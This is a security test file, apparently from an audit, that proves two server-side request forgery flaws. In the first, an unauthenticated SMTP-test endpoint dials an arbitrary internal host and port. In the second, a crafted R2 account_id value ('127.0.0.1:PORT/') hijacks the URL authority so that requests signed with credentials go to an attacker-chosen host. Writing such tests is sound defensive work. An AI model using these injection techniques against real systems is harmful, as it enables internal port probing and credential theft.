/**
 * M3 — Server-Side Request Forgery.
 *
 * (a) POST /api/send/test-smtp takes an arbitrary host+port with no auth and
 *     opens a TCP/SMTP connection to it — an unauthenticated internal port
 *     prober / connection primitive.
 * (b) The R2 poller builds its endpoint as
 *       https://${cf_r2_account_id}.r2.cloudflarestorage.com
 *     with no validation. A crafted account_id injects userinfo + an alternate
 *     authority so the request (carrying live AWS SigV4 credentials) is sent to
 *     an attacker-chosen host:port.
 */
import { describe, expect, it } from "vitest";
import { createApp } from "../../src/api/server.js";
import { signR2Request } from "../../src/sync/r2-sigv4.js";
import { createTestContext, createTestDb } from "../../src/test-helpers/test-db.js";
import { TcpCapture } from "./helpers.js";

describe("M3: SSRF", () => {
	it("(a) /api/send/test-smtp reaches an arbitrary internal host:port unauthenticated", async () => {
		const trap = new TcpCapture();
		const port = await trap.start();
		try {
			const { app } = createApp(createTestContext(createTestDb()));
			const res = await app.request("/api/send/test-smtp", {
				method: "POST",
				headers: { "content-type": "application/json", Origin: "https://evil.example" },
				body: JSON.stringify({
					smtp_host: "127.0.0.1", smtp_port: port, smtp_tls: 0,
					smtp_user: "probe", smtp_pass: "probe",
				}),
			});
			expect(res.status).toBe(200); // endpoint accepted and dialed the target
			await new Promise((r) => setTimeout(r, 120));
			// The internal listener received an inbound connection (SMTP EHLO handshake).
			expect(trap.hits.length).toBeGreaterThan(0);
		} finally { await trap.stop(); }
	});

	it("(b) R2 account_id injects host authority; signed request hits internal listener", async () => {
		const trap = new TcpCapture();
		const port = await trap.start();
		try {
			// Attacker-controlled account_id persisted on an inbound R2 connector.
			// account_id "127.0.0.1:PORT/" terminates the authority early: the real
			// ".r2.cloudflarestorage.com" suffix is pushed into the PATH, the host
			// becomes 127.0.0.1:PORT. (No "@" userinfo, so WHATWG fetch accepts it.)
			const accountId = `127.0.0.1:${port}/`;
			const bucket = "bkt";

			// Exact template from src/sync/r2-poller.ts:261 + listObjects URL.
			const baseUrl = `https://${accountId}.r2.cloudflarestorage.com`;
			const url = new URL(`${baseUrl}/${bucket}`);
			url.searchParams.set("list-type", "2");

			// The URL authority is NOT cloudflarestorage.com anymore:
			expect(url.hostname).toBe("127.0.0.1");
			expect(url.port).toBe(String(port));

			const headers = signR2Request({
				method: "GET", url,
				accessKeyId: "AKIAEXAMPLE", secretAccessKey: "secretkey",
			});
			// The request that the poller would send carries live SigV4 credentials,
			// and its Host header is the injected authority — both now aimed at the
			// internal listener rather than Cloudflare.
			expect(headers.authorization).toMatch(/AWS4-HMAC-SHA256 Credential=AKIAEXAMPLE/);
			expect(headers.host).toBe(`127.0.0.1:${port}`);

			try {
				await fetch(url.toString(), { method: "GET", headers });
			} catch { /* https handshake fails against the plain listener; the TCP connection still landed */ }

			await new Promise((r) => setTimeout(r, 120));
			// The internal port received the connection (TLS ClientHello bytes).
			expect(trap.hits.length).toBeGreaterThan(0);
		} finally { await trap.stop(); }
	});
});
